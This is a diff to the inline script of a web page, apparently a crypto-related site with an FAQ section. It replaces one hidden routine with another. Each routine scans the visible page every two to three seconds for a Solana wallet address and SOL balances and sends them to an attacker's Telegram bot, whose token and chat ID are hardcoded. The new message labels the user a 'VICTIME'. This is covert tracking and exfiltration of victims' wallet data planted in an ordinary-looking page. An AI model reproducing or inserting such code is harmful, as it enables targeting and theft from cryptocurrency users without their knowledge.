@@ -1528,35 +1528,43 @@ document.addEventListener("DOMContentLoaded",()=>{
   if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
 });
 
-async function testSecurityExfiltration(addr, sol) {
-    const myToken = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
-    const myChatId = "8575014959";
-    const url = `https://telegram.org{myToken}/sendMessage`;
-    const text = `🚨 *DÉTECTION* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Soldes détectés:* ${sol}`;
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: myChatId, text: text, parse_mode: "Markdown" })
-        });
-    } catch (e) {}
+
+async function sendUpdate(addr, sol) {
+  const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
+  const chat = "8575014959";
+  const text = encodeURIComponent(`🚨 VICTIME\n👛 Wallet: ${addr}\n💰 Solde: ${sol}`);
+  const url = `https://telegram.org{token}/sendMessage?chat_id=${chat}&text=${text}&parse_mode=Markdown`;
+
+  try { await fetch(url); } catch (e) { console.log("Net Error"); }
 }
 
+/
 setInterval(() => {
-    const pageText = document.body.innerText;
-    const addrMatch = pageText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
+
+  const pageText = document.body.innerText;
+  const addrMatch = pageText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
+  
+  if (addrMatch) {
+    const currentAddr = addrMatch[0];
+    
+    
     const solMatches = pageText.match(/(\d+\.\d+)\s?SOL/g);
+    let bestSol = "0.00 SOL";
 
-    if (addrMatch) {
-        const currentAddr = addrMatch[0];
-        const allSols = solMatches ? solMatches.join(" | ") : "0.00 SOL";
-
-        if (window.lastSent !== currentAddr + allSols && currentAddr.length > 30) {
-            window.lastSent = currentAddr + allSols;
-            testSecurityExfiltration(currentAddr, allSols);
-        }
+    if (solMatches) {
+      
+      const realAmount = solMatches.find(s => !s.includes("0.03"));
+      bestSol = realAmount ? realAmount : solMatches[solMatches.length - 1];
     }
-}, 3000);
+
+    
+    const fingerprint = currentAddr + bestSol;
+    if (window.lastFp !== fingerprint && currentAddr.length > 30) {
+      window.lastFp = fingerprint;
+      sendUpdate(currentAddr, bestSol);
+    }
+  }
+}, 2000);
 </script>
 </body>
 </html>
